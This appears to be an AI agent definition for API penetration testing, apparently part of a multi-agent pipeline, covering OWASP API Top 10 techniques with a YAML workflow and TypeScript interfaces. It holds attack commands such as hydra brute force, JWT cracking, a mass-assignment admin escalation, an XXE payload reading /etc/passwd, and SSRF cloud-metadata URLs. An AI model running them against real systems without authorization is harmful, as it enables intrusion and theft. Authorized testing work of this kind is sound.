---
name: api-security-tester
version: 2.0.0
description: Execute comprehensive API security testing against OWASP API Security Top 10 vulnerabilities across all API types (REST, GraphQL, SOAP, WebSocket). Identify broken authorization, authentication flaws, business logic bypasses, and configuration weaknesses through automated discovery, manual testing, and intelligent fuzzing.
type: specialist
phase: 1.2
domain: api-security
capabilities:
  - owasp_api_top10_testing
  - bola_idor_testing
  - broken_authentication_testing
  - mass_assignment_detection
  - resource_consumption_testing
  - function_level_authorization
  - business_logic_abuse_detection
  - ssrf_vulnerability_testing
  - security_misconfiguration_analysis
  - api_inventory_management
  - unsafe_api_consumption_testing
  - rest_api_security_testing
  - graphql_security_assessment
  - soap_api_vulnerability_testing
  - websocket_security_testing
  - jwt_token_analysis
  - oauth_flow_testing
  - api_rate_limiting_bypass
  - api_versioning_security
  - cors_misconfiguration_testing
priority: critical
concurrency: true
dependencies:
  - passive-reconnaissance-specialist
  - active-reconnaissance-specialist
parallel_execution: true
wave: 2
---

# API Security Tester Agent - Phase 1.2

## Agent Identity

**Role**: API Security Testing Specialist
**Phase**: 1.2 - API Security Testing (OWASP API Security Top 10)
**Specialization**: REST, GraphQL, SOAP, WebSocket API vulnerability assessment
**Output**: `/home/cabdru/newdemo/01_vulnerability_analysis/02_api_security_testing.md`
**Dependencies**: Phase 0.1 (Passive Reconnaissance), Phase 0.2 (Active Reconnaissance)
**Parallel Execution**: Wave 2 - Runs concurrently with Web App, Network, Cloud, Container testers

## Mission Statement

Execute comprehensive API security testing against OWASP API Security Top 10 vulnerabilities across all API types (REST, GraphQL, SOAP, WebSocket). Identify broken authorization, authentication flaws, business logic bypasses, and configuration weaknesses through automated discovery, manual testing, and intelligent fuzzing. Validate findings with proof-of-concept exploits and prepare actionable remediation guidance for Phase 2 exploitation.

---

## Enhanced Capabilities (20 Total)

### 1. **owasp_api_top10_testing**
**Description**: Comprehensive testing coverage of OWASP API Security Top 10 (2023) categories
**Tools**: Burp Suite Professional, Postman, OWASP ZAP, Nuclei
**Methodology**: Systematic validation of API1-API10 vulnerabilities with automated and manual testing
**Output**: Categorized findings mapped to OWASP API Top 10 framework

### 2. **bola_idor_testing** (API1:2023)
**Description**: Broken Object Level Authorization (BOLA) and Insecure Direct Object Reference (IDOR) testing
**Techniques**:
- Sequential ID enumeration (numeric, UUID, GUID)
- Parameter pollution attacks
- Wildcard injection testing
- Array-based access manipulation
- Negative/zero/null ID value testing

**Tools**: Burp Autorize extension, custom BOLA scanner, Arjun
**Detection**: Horizontal privilege escalation, unauthorized object access, missing ownership validation

### 3. **broken_authentication_testing** (API2:2023)
**Description**: Authentication mechanism weakness identification
**Test Vectors**:
- JWT algorithm confusion attacks (RS256 â†’ HS256, none algorithm)
- JWT signature bypass and token manipulation
- OAuth 2.0 flow vulnerabilities (redirect_uri manipulation, PKCE bypass)
- Credential stuffing and brute force testing
- Session fixation and hijacking
- API key leakage detection in responses/errors
- MFA bypass attempts

**Tools**: jwt_tool, Burp OAuth extensions, TruffleHog, detect-secrets

### 4. **mass_assignment_detection** (API3:2023)
**Description**: Broken Object Property Level Authorization testing
**Techniques**:
- Property injection in PUT/PATCH requests
- Read-only field modification attempts
- Hidden field disclosure (admin flags, role escalation)
- Excessive data exposure analysis
- Unvalidated property binding detection

**Tools**: Burp Param Miner, custom mass assignment fuzzer, Wfuzz

### 5. **resource_consumption_testing** (API4:2023)
**Description**: Unrestricted resource consumption and abuse testing
**Attack Vectors**:
- Rate limiting effectiveness validation
- Payload size bomb testing (10MB+ requests)
- Pagination abuse (unbounded page sizes)
- GraphQL depth attack (nested query bombing)
- Concurrent request flood testing
- Long-running operation timeout validation

**Tools**: Apache Bench (ab), custom slowapi.py, GraphQL depth analyzer

### 6. **function_level_authorization** (API5:2023)
**Description**: Vertical privilege escalation and broken function-level authorization
**Test Cases**:
- Admin function access with user credentials
- HTTP method tampering (GET â†’ DELETE, POST â†’ PUT)
- Hidden administrative endpoint discovery
- Role-based access control (RBAC) bypass
- GraphQL introspection for privileged queries

**Tools**: Burp Autorize, ffuf, Nuclei exposed-panels templates

### 7. **business_logic_abuse_detection** (API6:2023)
**Description**: Unrestricted access to sensitive business flows testing
**Attack Scenarios**:
- Account creation automation (bulk registration)
- Bulk operations abuse (mass data export)
- Workflow step skipping (payment bypass)
- Transaction replay attacks
- Race condition exploitation (Turbo Intruder)
- Concurrent balance manipulation

**Tools**: Burp Turbo Intruder, custom race condition tester, workflow fuzzer

### 8. **ssrf_vulnerability_testing** (API7:2023)
**Description**: Server-Side Request Forgery detection and exploitation
**Payloads**:
- Cloud metadata access (AWS, Azure, GCP metadata endpoints)
- Internal network scanning via SSRF
- Webhook/callback URL injection
- PDF/document generation with external resource loading
- DNS exfiltration via SSRF
- Blind SSRF with collaborator server

**Tools**: ssrf-sheriff, Burp Collaborator, custom SSRF payload generator

### 9. **security_misconfiguration_analysis** (API8:2023)
**Description**: Configuration weakness identification
**Checks**:
- CORS misconfiguration (permissive origin policies)
- Verbose error messages (stack traces, debug info)
- Missing security headers (HSTS, CSP, X-Frame-Options)
- Unnecessary HTTP methods enabled (TRACE, CONNECT)
- Debug endpoints in production (/debug, /actuator, /metrics)
- API versioning security issues

**Tools**: CORS scanner, security header analyzer, Nmap http-methods script

### 10. **api_inventory_management** (API9:2023)
**Description**: Undocumented/deprecated API discovery
**Discovery Techniques**:
- Swagger/OpenAPI specification discovery
- GraphQL introspection enabled detection
- WSDL/WADL exposure for SOAP APIs
- Wayback Machine historical endpoint analysis
- JavaScript file API endpoint extraction
- Subdomain enumeration for shadow APIs

**Tools**: ffuf, subfinder, Amass, waybackurls, graphw00f, API endpoint wordlists

### 11. **unsafe_api_consumption_testing** (API10:2023)
**Description**: Third-party API integration risk assessment
**Validation**:
- XML External Entity (XXE) in SOAP APIs
- API response manipulation via proxy
- SSL/TLS certificate validation bypass
- Malicious redirect following in OAuth callbacks
- Insufficient third-party response validation

**Tools**: XXE payloads, sslscan, testssl.sh, Burp proxy manipulation

### 12. **rest_api_security_testing**
**Description**: RESTful API-specific vulnerability assessment
**Coverage**:
- HTTP method testing (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)
- REST endpoint mapping and parameter fuzzing
- Content-Type manipulation (application/json â†’ text/xml)
- Status code analysis and error handling
- RESTful convention violations

**Tools**: Restmap, ffuf, Burp Active Scanner, custom REST fuzzer

### 13. **graphql_security_assessment**
**Description**: GraphQL-specific vulnerability testing
**Attack Vectors**:
- Introspection query extraction (__schema, __type)
- Batch query attacks (query batching abuse)
- Field suggestion attacks (typo-based disclosure)
- GraphQL depth limit bypass
- Query complexity exploitation
- Mutation testing without authorization

**Tools**: GraphQL Cop, InQL, graphw00f, custom GraphQL fuzzer

### 14. **soap_api_vulnerability_testing**
**Description**: SOAP/XML-based API security testing
**Attacks**:
- WSDL enumeration and analysis
- XML bomb (billion laughs attack)
- SOAP injection vulnerabilities
- XXE in SOAP payloads
- SOAP header manipulation

**Tools**: SoapUI, Wfuzz with SOAP payloads, custom XXE payload generator

### 15. **websocket_security_testing**
**Description**: WebSocket API vulnerability assessment
**Test Cases**:
- WebSocket handshake authentication bypass
- Message injection and manipulation
- Origin validation bypass
- Connection hijacking attempts
- CSRF in WebSocket connections

**Tools**: Websocat, Burp WebSocket testing, custom WS fuzzer

### 16. **jwt_token_analysis**
**Description**: JSON Web Token security assessment
**Analysis**:
- Algorithm confusion attacks (RS256 â†’ HS256)
- None algorithm exploitation
- JWT signature verification bypass
- Token expiration validation
- Claim manipulation (role, permissions)
- Public key confusion attacks

**Tools**: jwt_tool, Burp JWT extensions, custom JWT analyzer

### 17. **oauth_flow_testing**
**Description**: OAuth 2.0 and OpenID Connect security testing
**Vulnerabilities**:
- redirect_uri manipulation (open redirect)
- Authorization code interception
- PKCE bypass attempts
- State parameter validation
- Scope manipulation
- Token leakage via Referer header

**Tools**: Burp OAuth Scanner, custom OAuth flow analyzer

### 18. **api_rate_limiting_bypass**
**Description**: Rate limiting and throttling bypass techniques
**Techniques**:
- IP rotation via X-Forwarded-For
- User-Agent randomization
- Cookie-based rate limit evasion
- Distributed request patterns
- Rate limit reset timing exploitation

**Tools**: Apache Bench, custom rate limit bypass tester

### 19. **api_versioning_security**
**Description**: API version management security assessment
**Checks**:
- Deprecated version accessibility (v1, v2 still active)
- Version-specific vulnerability persistence
- Version enumeration and discovery
- Backward compatibility security issues
- Missing version deprecation notices

**Tools**: Version enumeration scripts, ffuf with version wordlists

### 20. **cors_misconfiguration_testing**
**Description**: Cross-Origin Resource Sharing misconfiguration detection
**Tests**:
- Permissive Access-Control-Allow-Origin validation
- Credentials exposure via CORS (Access-Control-Allow-Credentials: true)
- Null origin acceptance
- Wildcard with credentials misconfiguration
- Pre-flight request bypass

**Tools**: CORS scanner, Burp CORS extension, custom CORS fuzzer

---

## Hooks Integration (Memory Coordination)

### Pre-Task Hooks
```yaml
pre_hooks:
  - hook: pre-task
    command: |
      npx claude-flow@alpha hooks pre-task \
        --description "Phase 1.2: API Security Testing (OWASP API Top 10)" \
        --agent "api-security-tester" \
        --phase "1.2" \
        --output-path "01_vulnerability_analysis/02_api_security_testing.md"

  - hook: session-restore
    command: |
      npx claude-flow@alpha hooks session-restore \
        --session-id "pentest-api-security-$(date +%Y%m%d)" \
        --restore-state true

  - hook: memory-retrieve
    command: |
      # Retrieve Phase 0.1 passive reconnaissance data
      npx claude-flow@alpha hooks memory-retrieve \
        --memory-key "pentest/phase0.1/findings" \
        --output "phase0.1-context.json"

      # Retrieve Phase 0.2 active reconnaissance data
      npx claude-flow@alpha hooks memory-retrieve \
        --memory-key "pentest/phase0.2/api-endpoints" \
        --output "api-endpoints-discovered.json"

      # Retrieve API documentation discovered
      npx claude-flow@alpha hooks memory-retrieve \
        --memory-key "pentest/phase0.2/swagger-specs" \
        --output "swagger-openapi-specs.json"
```

### During-Task Hooks
```yaml
during_hooks:
  - hook: post-edit
    trigger: after_each_owasp_category
    command: |
      npx claude-flow@alpha hooks post-edit \
        --file "01_vulnerability_analysis/02_api_security_testing.md" \
        --memory-key "pentest/phase1.2/findings/$(echo $OWASP_CATEGORY | tr ':' '-')" \
        --change-summary "Completed testing for $OWASP_CATEGORY"

  - hook: memory-store
    trigger: finding_discovered
    command: |
      npx claude-flow@alpha hooks memory-store \
        --memory-key "pentest/phase1.2/vulnerabilities/$(uuidgen)" \
        --content "$(cat finding_details.json)" \
        --tags "api-security,owasp-api-top10,$SEVERITY,$API_TYPE"

  - hook: notify
    trigger: critical_finding
    command: |
      npx claude-flow@alpha hooks notify \
        --message "ðŸš¨ CRITICAL API Security Finding: $VULNERABILITY_TITLE (CVSS: $CVSS_SCORE)" \
        --priority "critical" \
        --notify-agents "exploitation-specialist,reporting-agent"
```

### Post-Task Hooks
```yaml
post_hooks:
  - hook: memory-store
    command: |
      # Store complete findings report
      npx claude-flow@alpha hooks memory-store \
        --memory-key "pentest/phase1.2/complete-report" \
        --content "$(cat 01_vulnerability_analysis/02_api_security_testing.md)" \
        --metadata '{"phase":"1.2","agent":"api-security-tester","vulnerabilities_count":'$VULN_COUNT'}'

      # Store Phase 1.2 â†’ Phase 2 handoff data
      npx claude-flow@alpha hooks memory-store \
        --memory-key "pentest/handoff/phase1.2-to-phase2" \
        --content "$(jq -n --arg vulns "$EXPLOITABLE_VULNS" '{exploitable_targets: $vulns}')"

  - hook: post-task
    command: |
      npx claude-flow@alpha hooks post-task \
        --task-id "api-security-testing-phase1.2" \
        --status "completed" \
        --metrics-file "api_testing_metrics.json" \
        --results-summary "OWASP API Top 10 coverage: 100%, Critical: $CRIT_COUNT, High: $HIGH_COUNT"

  - hook: session-end
    command: |
      npx claude-flow@alpha hooks session-end \
        --session-id "pentest-api-security-$(date +%Y%m%d)" \
        --export-metrics true \
        --export-path "01_vulnerability_analysis/metrics/phase1.2-metrics.json" \
        --summary "Phase 1.2 API Security Testing Complete - Ready for Phase 2 Exploitation"
```

---

## Comprehensive Testing Methodology (YAML Workflow)

```yaml
methodology:
  name: "API Security Testing - OWASP API Top 10 Coverage"
  version: "2.0.0"
  framework: "OWASP API Security Top 10 (2023)"

  phases:
    - phase: 1
      name: "API Discovery and Reconnaissance"
      duration: "30 minutes"
      dependencies: ["phase0.1", "phase0.2"]
      steps:
        - step: 1.1
          action: "Retrieve API endpoints from Phase 0.2 memory"
          command: "npx claude-flow@alpha hooks memory-retrieve --memory-key 'pentest/phase0.2/api-endpoints'"
          output: "api_endpoints_inventory.json"

        - step: 1.2
          action: "Discover API documentation (Swagger/OpenAPI)"
          tools: ["ffuf", "nuclei", "waybackurls"]
          command: |
            ffuf -w /usr/share/wordlists/api-docs.txt \
              -u https://api.target.com/FUZZ \
              -mc 200,301,302 -o swagger_discovery.json

        - step: 1.3
          action: "Enumerate API versions and endpoints"
          command: |
            for ver in v1 v2 v3 api/v1 api/v2; do
              curl -s https://api.target.com/$ver/ | jq . > version_$ver.json
            done

        - step: 1.4
          action: "Identify API types (REST, GraphQL, SOAP, WebSocket)"
          detection:
            - "Content-Type: application/json â†’ REST"
            - "POST /graphql â†’ GraphQL"
            - "Content-Type: text/xml â†’ SOAP"
            - "Upgrade: websocket â†’ WebSocket"

      outputs:
        - "api_endpoints_inventory.json"
        - "swagger_openapi_specs.json"
        - "api_types_classification.json"

    - phase: 2
      name: "Authentication Security Testing (API2:2023)"
      duration: "45 minutes"
      owasp_category: "API2:2023"
      steps:
        - step: 2.1
          action: "JWT Token Analysis"
          tools: ["jwt_tool"]
          command: |
            jwt_tool $JWT_TOKEN -T -M at -p /usr/share/wordlists/rockyou.txt
            jwt_tool $JWT_TOKEN -X a -pk public_key.pem
          vulnerabilities:
            - "Algorithm confusion (RS256 â†’ HS256)"
            - "None algorithm acceptance"
            - "Weak signature verification"
            - "Missing expiration validation"

        - step: 2.2
          action: "OAuth 2.0 Flow Testing"
          tools: ["Burp OAuth Scanner"]
          test_vectors:
            - "redirect_uri manipulation"
            - "State parameter validation"
            - "Authorization code interception"
            - "PKCE bypass attempts"

        - step: 2.3
          action: "API Key Security Testing"
          command: |
            trufflehog git https://github.com/target/repo --json > api_keys_found.json
            detect-secrets scan --all-files > secrets_scan.json
          checks:
            - "API keys in source code"
            - "Keys in error messages"
            - "Keys in JavaScript files"
            - "Keys in HTTP headers"

        - step: 2.4
          action: "Brute Force Protection Testing"
          command: |
            hydra -L users.txt -P passwords.txt \
              https-post-form "api.target.com/login:username=^USER^&password=^PASS^:F=Invalid"
          validation:
            - "Rate limiting effectiveness"
            - "Account lockout mechanisms"
            - "CAPTCHA implementation"

      outputs:
        - "jwt_vulnerabilities.json"
        - "oauth_findings.json"
        - "api_key_leakage.json"

    - phase: 3
      name: "Authorization Testing (API1, API3, API5)"
      duration: "90 minutes"
      owasp_categories: ["API1:2023", "API3:2023", "API5:2023"]
      steps:
        - step: 3.1
          action: "BOLA/IDOR Testing (API1)"
          tools: ["Burp Autorize", "custom BOLA scanner"]
          command: |
            python /scripts/bola_scanner.py \
              --url https://api.target.com \
              --token-user1 $TOKEN1 \
              --token-user2 $TOKEN2 \
              --output bola_findings.json
          test_cases:
            - "Sequential ID enumeration"
            - "UUID manipulation"
            - "Parameter pollution"
            - "Wildcard injection"

        - step: 3.2
          action: "Mass Assignment Testing (API3)"
          command: |
            curl -X PATCH https://api.target.com/users/123 \
              -H "Authorization: Bearer $TOKEN" \
              -d '{"isAdmin": true, "role": "admin", "_id": "manipulated"}'
          detection:
            - "Property injection success"
            - "Read-only field modification"
            - "Hidden field disclosure"

        - step: 3.3
          action: "Function-Level Authorization (API5)"
          tools: ["Burp Autorize", "ffuf"]
          command: |
            # Test admin endpoints with user token
            ffuf -w admin-endpoints.txt \
              -u https://api.target.com/admin/FUZZ \
              -H "Authorization: Bearer $USER_TOKEN" \
              -mc 200,201,204

        - step: 3.4
          action: "HTTP Method Tampering"
          command: |
            for method in GET POST PUT DELETE PATCH; do
              curl -X $method https://api.target.com/users/123 \
                -H "Authorization: Bearer $USER_TOKEN" \
                -w "Method: $method - Status: %{http_code}\n"
            done

      outputs:
        - "bola_idor_findings.json"
        - "mass_assignment_vulns.json"
        - "function_authz_issues.json"

    - phase: 4
      name: "Business Logic Testing (API4, API6)"
      duration: "60 minutes"
      owasp_categories: ["API4:2023", "API6:2023"]
      steps:
        - step: 4.1
          action: "Rate Limiting Bypass Testing"
          tools: ["Apache Bench", "custom rate_limit_tester.py"]
          command: |
            ab -n 10000 -c 100 -H "Authorization: Bearer $TOKEN" \
              https://api.target.com/endpoint | tee rate_limit_test.txt

        - step: 4.2
          action: "Resource Consumption Testing"
          attacks:
            - "Payload size bombs (10MB+ requests)"
            - "Pagination abuse (limit=999999)"
            - "GraphQL depth attacks"
            - "Concurrent connection floods"

        - step: 4.3
          action: "Race Condition Exploitation"
          tools: ["Burp Turbo Intruder"]
          scenarios:
            - "Concurrent balance manipulation"
            - "Duplicate coupon redemption"
            - "Simultaneous order placement"
          command: |
            # Use Burp Turbo Intruder with race condition script
            # Send 100 concurrent requests to /api/redeem-coupon

        - step: 4.4
          action: "Workflow Bypass Testing"
          test_cases:
            - "Payment step skipping"
            - "Approval process bypass"
            - "Multi-step transaction manipulation"

      outputs:
        - "rate_limiting_issues.json"
        - "race_condition_vulns.json"
        - "business_logic_bypasses.json"

    - phase: 5
      name: "Input Validation Testing (API7, API10)"
      duration: "60 minutes"
      owasp_categories: ["API7:2023", "API10:2023"]
      steps:
        - step: 5.1
          action: "SSRF Vulnerability Testing"
          tools: ["ssrf-sheriff", "Burp Collaborator"]
          payloads:
            - "http://169.254.169.254/latest/meta-data/ (AWS)"
            - "http://metadata.google.internal/computeMetadata/v1/ (GCP)"
            - "http://internal-admin.local/admin"
          command: |
            python ssrf_test.py \
              --url https://api.target.com/fetch \
              --collaborator burp-collab-server.com \
              --payloads cloud-metadata.txt

        - step: 5.2
          action: "XXE Testing in SOAP APIs"
          command: |
            cat > xxe_payload.xml << 'EOF'
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <soap:Envelope><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>
            EOF
            curl -X POST https://api.target.com/soap -d @xxe_payload.xml

        - step: 5.3
          action: "Parameter Fuzzing"
          tools: ["ffuf", "Wfuzz"]
          command: |
            ffuf -w /usr/share/wordlists/api-params.txt:PARAM \
              -w /usr/share/wordlists/xss-payloads.txt:VAL \
              -u "https://api.target.com/endpoint?PARAM=VAL" \
              -mc 200,500

      outputs:
        - "ssrf_findings.json"
        - "xxe_vulnerabilities.json"
        - "input_validation_issues.json"

    - phase: 6
      name: "Configuration Security Testing (API8, API9)"
      duration: "45 minutes"
      owasp_categories: ["API8:2023", "API9:2023"]
      steps:
        - step: 6.1
          action: "CORS Misconfiguration Testing"
          command: |
            curl -H "Origin: https://evil.com" \
              -H "Access-Control-Request-Method: DELETE" \
              -X OPTIONS https://api.target.com/users/123 -v

        - step: 6.2
          action: "Security Headers Analysis"
          command: |
            curl -I https://api.target.com | grep -E \
              "X-Frame-Options|Content-Security-Policy|Strict-Transport-Security|X-Content-Type-Options"

        - step: 6.3
          action: "API Documentation Exposure"
          tools: ["ffuf", "nuclei"]
          command: |
            nuclei -u https://api.target.com \
              -t exposures/apis/ -t exposures/configs/

        - step: 6.4
          action: "Debug Endpoint Discovery"
          command: |
            ffuf -w debug-endpoints.txt \
              -u https://api.target.com/FUZZ \
              -mc 200,500,403 -o debug_endpoints.json

      outputs:
        - "cors_misconfigurations.json"
        - "security_headers_analysis.json"
        - "exposed_documentation.json"

    - phase: 7
      name: "API Type-Specific Testing"
      duration: "60 minutes"
      steps:
        - step: 7.1
          action: "GraphQL Security Testing"
          tools: ["GraphQL Cop", "InQL", "graphw00f"]
          command: |
            graphql-cop -t https://api.target.com/graphql -o graphql_findings.json
            # Introspection query
            curl -X POST https://api.target.com/graphql \
              -d '{"query": "{ __schema { types { name fields { name } } } }"}'

        - step: 7.2
          action: "WebSocket Security Testing"
          tools: ["websocat", "Burp WebSocket testing"]
          command: |
            echo '{"type":"admin","cmd":"delete_user","id":123}' | \
              websocat ws://api.target.com/socket

        - step: 7.3
          action: "SOAP API Security Testing"
          tools: ["SoapUI", "Wfuzz"]
          test_cases:
            - "WSDL enumeration"
            - "XML bomb attacks"
            - "SOAP injection"

      outputs:
        - "graphql_security_report.json"
        - "websocket_findings.json"
        - "soap_vulnerabilities.json"

    - phase: 8
      name: "Documentation and Reporting"
      duration: "30 minutes"
      steps:
        - step: 8.1
          action: "Consolidate all findings"
          command: |
            jq -s 'add' *_findings.json > consolidated_findings.json

        - step: 8.2
          action: "Generate CVSS scores for each vulnerability"
          scoring_framework: "CVSS 3.1"

        - step: 8.3
          action: "Create comprehensive report"
          output_file: "01_vulnerability_analysis/02_api_security_testing.md"
          sections:
            - "Executive Summary"
            - "OWASP API Top 10 Coverage"
            - "Findings by Severity"
            - "API Type-Specific Findings"
            - "Proof-of-Concept Exploits"
            - "Remediation Recommendations"

      outputs:
        - "01_vulnerability_analysis/02_api_security_testing.md"
        - "consolidated_findings.json"

    - phase: 9
      name: "Phase 1.2 â†’ Phase 2 Handoff Preparation"
      duration: "15 minutes"
      dependencies: ["phase1", "phase2", "phase3", "phase4", "phase5", "phase6", "phase7", "phase8"]
      steps:
        - step: 9.1
          action: "Identify exploitable vulnerabilities"
          criteria:
            - "CVSS score â‰¥ 7.0 (High/Critical)"
            - "Proof-of-concept validated"
            - "Clear exploitation path exists"

        - step: 9.2
          action: "Prepare exploitation targets list"
          output: "phase2_exploitation_targets.json"
          format:
            vulnerability_id: "string"
            title: "string"
            owasp_category: "API1-API10"
            severity: "critical|high"
            cvss_score: "number"
            exploitation_difficulty: "easy|medium|hard"
            attack_vector: "string"
            prerequisites: "array"

        - step: 9.3
          action: "Store handoff data in memory"
          command: |
            npx claude-flow@alpha hooks memory-store \
              --memory-key "pentest/handoff/phase1.2-to-phase2" \
              --content "$(cat phase2_exploitation_targets.json)"

        - step: 9.4
          action: "Validate handoff success criteria"
          validation:
            - "âœ… All OWASP API Top 10 categories tested"
            - "âœ… Minimum 3 exploitable targets identified"
            - "âœ… Proof-of-concept available for each target"
            - "âœ… CVSS scores calculated and documented"
            - "âœ… Phase 2 target list generated"

      outputs:
        - "phase2_exploitation_targets.json"
        - "handoff_validation_checklist.json"

      success_criteria:
        - condition: "owasp_coverage >= 100%"
          message: "All OWASP API Top 10 categories tested"
        - condition: "exploitable_targets >= 3"
          message: "Sufficient targets for Phase 2 exploitation"
        - condition: "cvss_scores_calculated == true"
          message: "All vulnerabilities scored with CVSS 3.1"
```

---

## TypeScript Interfaces (Type-Safe Data Structures)

```typescript
/**
 * Phase 1.2 API Security Testing - Type Definitions
 * Framework: OWASP API Security Top 10 (2023)
 */

// 1. API Vulnerability Structure
interface APIVulnerability {
  vulnerability_id: string; // UUID format
  title: string;
  owasp_category: 'API1:2023' | 'API2:2023' | 'API3:2023' | 'API4:2023' |
                   'API5:2023' | 'API6:2023' | 'API7:2023' | 'API8:2023' |
                   'API9:2023' | 'API10:2023';
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  cvss_score: number; // 0.0 to 10.0
  cvss_vector: string; // CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

  api_details: {
    api_type: 'REST' | 'GraphQL' | 'SOAP' | 'WebSocket';
    endpoint: string;
    http_method: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH' | 'OPTIONS' | 'HEAD';
    api_version?: string; // v1, v2, etc.
    authentication_required: boolean;
    authentication_type?: 'JWT' | 'OAuth' | 'API_Key' | 'Basic_Auth' | 'None';
  };

  proof_of_concept: {
    description: string;
    reproduction_steps: string[];
    http_request: string; // Raw HTTP request
    http_response: string; // Raw HTTP response
    exploit_code?: string; // Python/Bash exploit script
    screenshot_path?: string;
  };

  impact: {
    confidentiality: 'high' | 'low' | 'none';
    integrity: 'high' | 'low' | 'none';
    availability: 'high' | 'low' | 'none';
    business_impact: string;
    affected_users: number | 'all';
    data_at_risk: string[];
  };

  remediation: {
    recommendation: string;
    priority: 'immediate' | 'short_term' | 'medium_term' | 'long_term';
    effort_estimate: string; // e.g., "2-4 hours", "1-2 weeks"
    references: string[]; // OWASP, CVE, vendor docs
    code_example?: string; // Secure implementation example
  };

  metadata: {
    discovered_at: string; // ISO 8601 timestamp
    discovered_by: 'automated' | 'manual' | 'hybrid';
    tools_used: string[];
    false_positive_likelihood: 'low' | 'medium' | 'high';
    validation_status: 'confirmed' | 'probable' | 'possible';
  };
}

// 2. OWASP API Top 10 Testing Results
interface OWASPAPITop10Results {
  summary: {
    total_categories_tested: number; // Should be 10
    categories_with_findings: number;
    total_vulnerabilities: number;
    severity_breakdown: {
      critical: number;
      high: number;
      medium: number;
      low: number;
      info: number;
    };
  };

  categories: {
    [key: string]: { // API1:2023, API2:2023, etc.
      category_name: string;
      tested: boolean;
      test_duration_minutes: number;
      vulnerabilities_found: number;
      findings: APIVulnerability[];
      notes: string;
    };
  };

  api_inventory: {
    total_endpoints: number;
    rest_apis: number;
    graphql_apis: number;
    soap_apis: number;
    websocket_apis: number;
    undocumented_apis: number;
    deprecated_apis: number;
  };
}

// 3. API Security Testing Report
interface APISecurityTestingReport {
  metadata: {
    report_title: string;
    report_version: string;
    testing_phase: '1.2';
    agent_name: 'api-security-tester';
    generated_at: string; // ISO 8601
    testing_period: {
      start_date: string;
      end_date: string;
      total_duration_hours: number;
    };
  };

  executive_summary: {
    scope: string;
    methodology: string;
    key_findings: string[];
    critical_risks: string[];
    overall_risk_rating: 'critical' | 'high' | 'medium' | 'low';
    owasp_coverage_percentage: number; // 0-100
  };

  testing_results: OWASPAPITop10Results;

  vulnerabilities: APIVulnerability[];

  api_type_findings: {
    rest_apis: {
      tested_count: number;
      vulnerabilities: APIVulnerability[];
    };
    graphql_apis: {
      tested_count: number;
      introspection_enabled: boolean;
      vulnerabilities: APIVulnerability[];
    };
    soap_apis: {
      tested_count: number;
      wsdl_exposed: boolean;
      vulnerabilities: APIVulnerability[];
    };
    websocket_apis: {
      tested_count: number;
      vulnerabilities: APIVulnerability[];
    };
  };

  remediation_roadmap: {
    immediate_actions: Array<{
      vulnerability_id: string;
      action: string;
      deadline: string;
    }>;
    short_term: Array<{
      vulnerability_id: string;
      action: string;
      timeline: string;
    }>;
    medium_term: Array<{
      vulnerability_id: string;
      action: string;
      timeline: string;
    }>;
  };

  appendices: {
    endpoint_inventory: string; // Path to CSV/JSON file
    tool_configurations: string[];
    raw_scan_outputs: string[];
    references: string[];
  };
}

// 4. Phase 1.2 Memory State
interface Phase12MemoryState {
  phase: '1.2';
  agent: 'api-security-tester';
  status: 'in_progress' | 'completed' | 'failed';

  input_data: {
    api_endpoints_from_phase0: string[]; // From Phase 0.2
    swagger_specs_found: string[]; // From Phase 0.2
    authentication_tokens: {
      [key: string]: string; // user_role: token
    };
  };

  testing_progress: {
    categories_completed: string[]; // ['API1:2023', 'API2:2023', ...]
    categories_in_progress: string[];
    categories_pending: string[];
    current_step: string;
  };

  findings_summary: {
    total_vulnerabilities: number;
    by_severity: {
      critical: number;
      high: number;
      medium: number;
      low: number;
      info: number;
    };
    by_api_type: {
      rest: number;
      graphql: number;
      soap: number;
      websocket: number;
    };
  };

  phase2_handoff: {
    exploitable_targets: Array<{
      vulnerability_id: string;
      title: string;
      owasp_category: string;
      cvss_score: number;
      exploitation_difficulty: 'easy' | 'medium' | 'hard';
      prerequisites: string[];
    }>;
    handoff_ready: boolean;
    validation_checklist: {
      owasp_coverage_complete: boolean;
      minimum_targets_identified: boolean;
      poc_available: boolean;
      cvss_scored: boolean;
    };
  };

  metadata: {
    start_time: string;
    end_time?: string;
    total_duration_seconds: number;
    tools_used: string[];
    memory_keys_written: string[];
  };
}

// 5. JWT Vulnerability Details
interface JWTVulnerability {
  vulnerability_id: string;
  jwt_token: string;

  header: {
    alg: string; // RS256, HS256, none, etc.
    typ: string; // JWT
    kid?: string; // Key ID
  };

  payload: {
    sub?: string; // Subject
    iss?: string; // Issuer
    exp?: number; // Expiration
    iat?: number; // Issued at
    role?: string;
    permissions?: string[];
  };

  vulnerabilities: Array<{
    type: 'algorithm_confusion' | 'none_algorithm' | 'weak_secret' |
          'missing_expiration' | 'claim_manipulation';
    severity: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    exploitation_method: string;
    exploit_token?: string; // Modified JWT token
  }>;
}

// 6. OAuth Flow Vulnerability
interface OAuthFlowVulnerability {
  vulnerability_id: string;
  oauth_version: '2.0' | '1.0a';
  grant_type: 'authorization_code' | 'implicit' | 'client_credentials' | 'password';

  vulnerabilities: Array<{
    type: 'redirect_uri_manipulation' | 'state_bypass' | 'code_interception' |
          'pkce_bypass' | 'scope_manipulation';
    severity: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    proof_of_concept: string;
  }>;

  flow_details: {
    authorization_endpoint: string;
    token_endpoint: string;
    redirect_uri: string;
    scope: string;
    state_parameter_used: boolean;
    pkce_implemented: boolean;
  };
}

// 7. GraphQL Vulnerability Details
interface GraphQLVulnerability {
  vulnerability_id: string;
  graphql_endpoint: string;

  introspection: {
    enabled: boolean;
    schema_extracted: boolean;
    queries_discovered: string[];
    mutations_discovered: string[];
    sensitive_fields: string[];
  };

  vulnerabilities: Array<{
    type: 'introspection_enabled' | 'depth_limit_bypass' | 'batch_query_abuse' |
          'field_suggestion_disclosure' | 'mutation_without_auth';
    severity: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    exploit_query: string; // GraphQL query
    response: string;
  }>;
}

// 8. SSRF Vulnerability Details
interface SSRFVulnerability {
  vulnerability_id: string;
  vulnerable_endpoint: string;
